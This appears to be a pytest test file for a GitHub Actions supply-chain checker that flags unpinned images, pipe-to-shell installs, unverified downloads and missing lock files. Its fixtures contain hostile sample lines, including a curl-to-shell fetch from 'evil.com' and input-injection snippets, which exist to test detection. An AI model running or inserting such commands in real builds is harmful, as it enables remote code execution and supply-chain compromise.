#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
#
from unittest import mock

from verify_action_build.security import (
    analyze_binary_downloads,
    analyze_binary_downloads_recursive,
    analyze_dockerfile,
    analyze_lock_files,
    analyze_scripts,
    analyze_action_metadata,
    analyze_repo_metadata,
)
from verify_action_build.security import (
    _file_is_pure_data_fetch,
    _find_binary_downloads_js,
)


class TestAnalyzeDockerfile:
    def _mock_fetch(self, files: dict):
        """Return a mock for fetch_file_from_github and fetch_action_yml."""
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_digest_pinned_no_warnings(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0

    def test_unpinned_from_warns(self):
        files = {
            "Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("not pinned" in w for w in warnings)

    def test_tag_pinned_warns(self):
        files = {
            "Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("tag-pinned" in w for w in warnings)

    def test_suspicious_curl(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc\nRUN curl https://evil.com/script.sh | sh\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("curl" in w.lower() or "evil" in w.lower() for w in warnings)

    def test_multistage_internal_from_no_warnings(self):
        dockerfile = (
            "FROM node:20@sha256:abc123 AS builder\n"
            "RUN npm ci\n"
            "FROM builder AS runtime\n"
            "CMD [\"node\", \"index.js\"]\n"
        )
        files = {"Dockerfile": dockerfile}
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_dockerfile_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0


class TestAnalyzeScripts:
    def _mock_fetch_file(self, files):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_detects_eval(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - run: python script.py
"""
        files = {
            "script.py": 'eval("malicious code")\n',
        }
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch_file(files)):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        # Script analysis finds suspicious patterns (eval is in findings)
        # Warnings list may be empty since script analysis only logs to console
        # but doesn't add to warnings for all patterns
        assert isinstance(warnings, list)

    def test_no_scripts_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        assert warnings == []


class TestAnalyzeActionMetadata:
    def test_pipe_to_shell_warns(self):
        # Multi-line run: blocks are needed — single-line run: is detected
        # as a block start and the content is on the next line.
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        curl https://example.com | sh
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("pipe-to-shell" in w for w in warnings)

    def test_input_interpolation_warns(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        echo ${{ inputs.name }}
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("injection" in w for w in warnings)

    def test_clean_action_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_action_yml_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_secret_default_warns(self):
        action_yml = """\
name: Test
inputs:
  token:
    default: ${{ secrets.GITHUB_TOKEN }}
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("secret" in w for w in warnings)


class TestAnalyzeBinaryDownloads:
    def _mock_fetch(self, files: dict):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_no_files_no_results(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert warnings == []
        assert failures == []

    def test_pipe_to_shell_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSL https://example.com/install.sh | sh\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("install.sh" in f for f in failures)

    def test_curl_binary_without_verification_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && tar xf tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_sha256sum_verification_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && echo 'abc123deadbeefcafef00d  tool.tar.gz' | sha256sum -c\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_gpg_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && curl -fsSLO https://example.com/tool.tar.gz.sig \\\n"
                " && gpg --verify tool.tar.gz.sig tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_cosign_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && cosign verify-blob tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_apk_add_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN apk add --no-cache curl wget bash\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_pip_install_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM python:3.12@sha256:abc\n"
                "RUN pip install requests==2.31.0\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_dockerfile_add_url_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "ADD https://example.com/app.tar.gz /app.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_unverified_fails(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_with_verification_passes(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download and verify
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        echo "abc123deadbeef  tool.tar.gz" | sha256sum -c
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_releases_download_path_flagged(self):
        # URL without a binary extension but under /releases/download/ still
        # looks like a binary artefact — flag it.
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLo /usr/local/bin/mytool "
                "https://github.com/x/y/releases/download/v1/mytool-linux-amd64 "
                "&& chmod +x /usr/local/bin/mytool\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1


class TestAnalyzeBinaryDownloadsRecursive:
    def test_recurses_through_composite(self):
        # Root is a composite action that uses an unpinned-looking hash-pinned
        # nested action; nested action has an unverified download.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: other/helper@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"""
        nested_yml = """\
name: Helper
runs:
  using: composite
  steps:
    - name: Download
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            if org == "other":
                return nested_yml
            return None

        def fake_file(org, repo, commit, path):
            return None

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fake_file):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_skips_trusted_org(self):
        # Nested uses: actions/checkout — should be skipped (trusted), so no
        # recursion into it even if it had downloads.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: actions/checkout@cccccccccccccccccccccccccccccccccccccccc
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            raise AssertionError(f"should not fetch nested yml for {org}/{repo}")

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert failures == []


class TestAnalyzeRepoMetadata:
    def test_mit_license_detected(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License\n\nCopyright..."
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0

    def test_no_license_warns(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            warnings = analyze_repo_metadata("unknown-org", "unknown-repo", "a" * 40)
        assert any("LICENSE" in w for w in warnings)

    def test_well_known_org(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License"
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0


class TestAnalyzeLockFiles:
    def _run(self, files: dict, sub_path: str = "") -> list[str]:
        def fetch(org, repo, commit, path):
            return files.get(path)

        with mock.patch(
            "verify_action_build.security.fetch_file_from_github",
            side_effect=fetch,
        ):
            return analyze_lock_files("org", "repo", "a" * 40, sub_path=sub_path)

    # --- Node --------------------------------------------------------------

    def test_node_package_json_with_package_lock_passes(self):
        files = {
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
            "package-lock.json": "{}",
        }
        assert self._run(files) == []

    def test_node_package_json_with_yarn_lock_passes(self):
        files = {"package.json": "{}", "yarn.lock": ""}
        assert self._run(files) == []

    def test_node_package_json_with_pnpm_lock_passes(self):
        files = {"package.json": "{}", "pnpm-lock.yaml": ""}
        assert self._run(files) == []

    def test_node_package_json_with_bun_lock_passes(self):
        files = {"package.json": "{}", "bun.lock": ""}
        assert self._run(files) == []

    def test_node_package_json_without_lock_fails(self):
        errors = self._run({"package.json": '{"name":"x"}'})
        assert len(errors) == 1
        assert "package.json" in errors[0]
        assert "package-lock.json" in errors[0]

    # --- Python ------------------------------------------------------------

    def test_python_pyproject_with_uv_lock_passes(self):
        files = {
            "pyproject.toml": '[project]\nname="x"\ndependencies = ["requests"]\n',
            "uv.lock": "",
        }
        assert self._run(files) == []

    def test_python_pyproject_with_poetry_lock_passes(self):
        files = {
            "pyproject.toml": "[tool.poetry.dependencies]\npython = '^3.11'\n",
            "poetry.lock": "",
        }
        assert self._run(files) == []

    def test_python_pyproject_with_requirements_txt_passes(self):
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
            "requirements.txt": "requests==2.31.0\n",
        }
        assert self._run(files) == []

    def test_python_pyproject_without_lock_fails(self):
        files = {
            "pyproject.toml": '[project]\nname="x"\ndependencies = ["requests"]\n',
        }
        errors = self._run(files)
        assert len(errors) == 1
        assert "pyproject.toml" in errors[0]

    def test_python_pyproject_without_deps_skipped(self):
        # Bare config (ruff, black, mypy settings) doesn't need a lock.
        files = {
            "pyproject.toml": "[tool.ruff]\nline-length = 100\n",
        }
        assert self._run(files) == []

    def test_python_pipfile_with_lock_passes(self):
        files = {"Pipfile": "[packages]\nrequests = '*'\n", "Pipfile.lock": "{}"}
        assert self._run(files) == []

    def test_python_pipfile_without_lock_fails(self):
        errors = self._run({"Pipfile": "[packages]\nrequests = '*'\n"})
        assert len(errors) == 1
        assert "Pipfile" in errors[0]

    # --- Deno --------------------------------------------------------------

    def test_deno_with_lock_passes(self):
        files = {"deno.json": '{"imports":{}}', "deno.lock": "{}"}
        assert self._run(files) == []

    def test_deno_jsonc_without_lock_fails(self):
        errors = self._run({"deno.jsonc": "{}"})
        assert len(errors) == 1
        assert "deno.jsonc" in errors[0]

    # --- Dart --------------------------------------------------------------

    def test_dart_with_pubspec_lock_passes(self):
        files = {"pubspec.yaml": "name: x\n", "pubspec.lock": ""}
        assert self._run(files) == []

    def test_dart_without_lock_fails(self):
        errors = self._run({"pubspec.yaml": "name: x\n"})
        assert len(errors) == 1
        assert "pubspec.yaml" in errors[0]

    # --- Ruby --------------------------------------------------------------

    def test_ruby_with_gemfile_lock_passes(self):
        files = {"Gemfile": "gem 'rails'\n", "Gemfile.lock": ""}
        assert self._run(files) == []

    def test_ruby_without_lock_fails(self):
        errors = self._run({"Gemfile": "gem 'rails'\n"})
        assert len(errors) == 1

    # --- Go ----------------------------------------------------------------

    def test_go_with_sum_passes(self):
        files = {
            "go.mod": "module x\n\nrequire github.com/a/b v1.2.3\n",
            "go.sum": "github.com/a/b v1.2.3 h1:...\n",
        }
        assert self._run(files) == []

    def test_go_without_sum_fails(self):
        files = {"go.mod": "module x\n\nrequire github.com/a/b v1.2.3\n"}
        errors = self._run(files)
        assert len(errors) == 1
        assert "go.mod" in errors[0]

    def test_go_without_requires_skipped(self):
        # go.mod with no external deps doesn't need go.sum.
        assert self._run({"go.mod": "module x\n\ngo 1.21\n"}) == []

    # --- Rust --------------------------------------------------------------

    def test_rust_binary_without_lock_fails(self):
        # Default binary crate — Cargo.lock expected.
        files = {"Cargo.toml": '[package]\nname = "x"\n'}
        errors = self._run(files)
        assert len(errors) == 1

    def test_rust_binary_with_lock_passes(self):
        files = {
            "Cargo.toml": '[package]\nname = "x"\n',
            "Cargo.lock": "",
        }
        assert self._run(files) == []

    def test_rust_library_without_lock_skipped(self):
        # [lib] without [[bin]] — library crate, Cargo.lock not conventionally committed.
        files = {
            "Cargo.toml": '[package]\nname = "x"\n\n[lib]\nname = "x"\n',
        }
        assert self._run(files) == []

    def test_rust_library_with_bin_still_requires_lock(self):
        files = {
            "Cargo.toml": (
                '[package]\nname = "x"\n'
                '[lib]\nname = "x"\n'
                '[[bin]]\nname = "x-cli"\n'
            ),
        }
        errors = self._run(files)
        assert len(errors) == 1

    def test_rust_workspace_requires_lock(self):
        files = {"Cargo.toml": '[workspace]\nmembers = ["a"]\n'}
        errors = self._run(files)
        assert len(errors) == 1

    # --- Sub-path handling ------------------------------------------------

    def test_sub_path_manifest_detected(self):
        # Manifest in sub-path with lock in sub-path — passes.
        files = {
            "sub/package.json": "{}",
            "sub/package-lock.json": "{}",
        }
        assert self._run(files, sub_path="sub") == []

    def test_sub_path_falls_back_to_root(self):
        # Sub-action may reuse repo-root manifests.
        files = {
            "package.json": "{}",
            "package-lock.json": "{}",
        }
        assert self._run(files, sub_path="sub") == []

    def test_sub_path_without_lock_fails(self):
        files = {"sub/package.json": "{}"}
        errors = self._run(files, sub_path="sub")
        assert len(errors) == 1
        assert "sub/package.json" in errors[0]

    # --- No manifests -----------------------------------------------------

    def test_no_manifests_found_passes(self):
        # Pure composite action — no manifests anywhere.
        assert self._run({}) == []

    # --- Multiple ecosystems -----------------------------------------------

    def test_multiple_ecosystems_all_missing_aggregates_errors(self):
        files = {
            "package.json": "{}",
            "go.mod": "module x\n\nrequire a v1\n",
            "pubspec.yaml": "name: x\n",
        }
        errors = self._run(files)
        assert len(errors) == 3

    # --- Exemptions -------------------------------------------------------

    def _run_with_exemptions(
        self,
        files: dict,
        exemptions: dict,
        org: str = "org",
        repo: str = "repo",
    ) -> list[str]:
        def fetch(o, r, commit, path):
            return files.get(path)

        with mock.patch(
            "verify_action_build.security.fetch_file_from_github",
            side_effect=fetch,
        ):
            return analyze_lock_files(org, repo, "a" * 40, exemptions=exemptions)

    def test_exemption_skips_matching_ecosystem(self):
        # pyproject.toml with deps but no lock — normally fails; exempted here.
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
        }
        errors = self._run_with_exemptions(
            files, {("org", "repo"): {"python"}},
        )
        assert errors == []

    def test_exemption_does_not_skip_other_ecosystems(self):
        # Exempt only python; node still fails.
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
            "package.json": "{}",
        }
        errors = self._run_with_exemptions(
            files, {("org", "repo"): {"python"}},
        )
        assert len(errors) == 1
        assert "package.json" in errors[0]

    def test_exemption_case_insensitive(self):
        # Look-up key lowercases org/repo, so an exemption entry written as
        # "Pypa/cibuildwheel" matches a run on "pypa/cibuildwheel".
        files = {"pyproject.toml": '[project]\ndependencies = ["a"]\n'}
        errors = self._run_with_exemptions(
            files, {("pypa", "cibuildwheel"): {"python"}},
            org="Pypa", repo="CIBuildWheel",
        )
        assert errors == []

    def test_exemption_for_different_repo_does_not_apply(self):
        files = {"pyproject.toml": '[project]\ndependencies = ["a"]\n'}
        errors = self._run_with_exemptions(
            files, {("other", "project"): {"python"}},
        )
        assert len(errors) == 1

    # --- Exemption file parser -------------------------------------------

    def test_exemption_file_parses(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        yml = tmp_path / "lock_file_exemptions.yml"
        yml.write_text(
            "# comment\n"
            "pypa/cibuildwheel:\n"
            "  - python\n"
            "\n"
            "dart-lang/setup-dart:\n"
            "  - dart  # trailing comment\n"
        )
        result = _load_lock_file_exemptions(yml)
        assert result == {
            ("pypa", "cibuildwheel"): {"python"},
            ("dart-lang", "setup-dart"): {"dart"},
        }

    def test_exemption_file_missing_returns_empty(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        result = _load_lock_file_exemptions(tmp_path / "does-not-exist.yml")
        assert result == {}

    def test_exemption_file_multiple_ecosystems_per_repo(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        yml = tmp_path / "lock_file_exemptions.yml"
        yml.write_text(
            "some/multiecosystem-repo:\n"
            "  - python\n"
            "  - dart\n"
        )
        result = _load_lock_file_exemptions(yml)
        assert result[("some", "multiecosystem-repo")] == {"python", "dart"}


class TestPureDataFetchExemption:
    """The binary-download check should not flag JS files that fetch HTTP
    responses purely as data (regex-parsed, JSON.parse'd, etc.) when nothing
    in the file persists or executes the response."""

    # The exact pattern that triggered the false positive on PR #752
    # (dependabot/fetch-metadata): badge fetch + regex match + parseInt.
    DEPENDABOT_BADGE_FETCH = """\
import * as https from 'https'

export async function getCompatibility (name, oldVersion, newVersion, ecosystem) {
  const svg = await new Promise((resolve) => {
    https.get(`https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=${name}&package-manager=${ecosystem}&previous-version=${oldVersion}&new-version=${newVersion}`, res => {
      let data = ''
      res.on('data', chunk => { data += chunk.toString('utf8') })
      res.on('end', () => { resolve(data) })
    }).on('error', () => { resolve('') })
  })

  const scoreChunk = svg.match(/<title>compatibility: (?<score>\\d+)%<\\/title>/m)
  return scoreChunk?.groups ? parseInt(scoreChunk.groups.score) : 0
}
"""

    LUAROCKS_BINARY_DOWNLOAD = """\
import * as tc from "@actions/tool-cache"

const sourceTar = await tc.downloadTool(`https://luarocks.org/releases/luarocks-${v}.tar.gz`)
await tc.extractTar(sourceTar, dest)
"""

    def test_pure_data_fetch_exempted(self):
        # https.get + .match + parseInt, no extract/write/exec → exempted.
        assert _file_is_pure_data_fetch(self.DEPENDABOT_BADGE_FETCH) is True
        assert _find_binary_downloads_js(self.DEPENDABOT_BADGE_FETCH) == []

    def test_real_binary_download_still_flagged(self):
        # tc.downloadTool followed by tc.extractTar → not exempt.
        assert _file_is_pure_data_fetch(self.LUAROCKS_BINARY_DOWNLOAD) is False
        findings = _find_binary_downloads_js(self.LUAROCKS_BINARY_DOWNLOAD)
        assert len(findings) == 1
        assert "downloadTool" in findings[0][1]

    def test_data_fetch_with_extract_in_same_file_not_exempt(self):
        # File mixes a metadata fetch and a real binary extraction. The
        # heuristic is intentionally conservative: any binary-handling
        # marker in the file disables the exemption for everything in it.
        mixed = """\
import * as https from 'https'
import * as tc from "@actions/tool-cache"

const meta = await new Promise((r) => https.get('https://x/y.json', res => {/*...*/}))
const parsed = JSON.parse(meta)

const archive = await tc.downloadTool('https://x/foo.tar.gz')
await tc.extractTar(archive, dest)
"""
        assert _file_is_pure_data_fetch(mixed) is False
        findings = _find_binary_downloads_js(mixed)
        # Both downloads remain flagged.
        assert len(findings) == 2

    def test_no_data_parse_marker_not_exempt(self):
        # A fetch that doesn't visibly parse the response shouldn't be
        # exempted by accident — we can't tell if it's binary or data.
        opaque = """\
import * as https from 'https'

https.get('https://x/y', res => { /* opaque */ })
"""
        assert _file_is_pure_data_fetch(opaque) is False
        assert len(_find_binary_downloads_js(opaque)) == 1

    def test_chmod_plus_x_in_string_disables_exemption(self):
        # chmod +x on a downloaded path is a strong "this is an executable"
        # signal even with parse markers also present.
        mixed = """\
const r = await fetch('https://x/y')
const txt = await r.text()
const score = parseInt(txt)
exec.exec('chmod +x ./downloaded')
"""
        assert _file_is_pure_data_fetch(mixed) is False

    def test_json_parse_alone_exempts(self):
        json_fetch = """\
import * as https from 'https'

const data = await new Promise((r) => https.get('https://api.x/v1/info', res => { r(res) }))
const parsed = JSON.parse(data)
return parsed.version
"""
        assert _file_is_pure_data_fetch(json_fetch) is True
        assert _find_binary_downloads_js(json_fetch) == []

    def test_split_alone_exempts(self):
        # .split is a common data-parse operation.
        split_fetch = """\
const data = await fetch('https://x/y').then(r => r.text())
const lines = data.split('\\n')
return lines[0]
"""
        assert _file_is_pure_data_fetch(split_fetch) is True
        assert _find_binary_downloads_js(split_fetch) == []
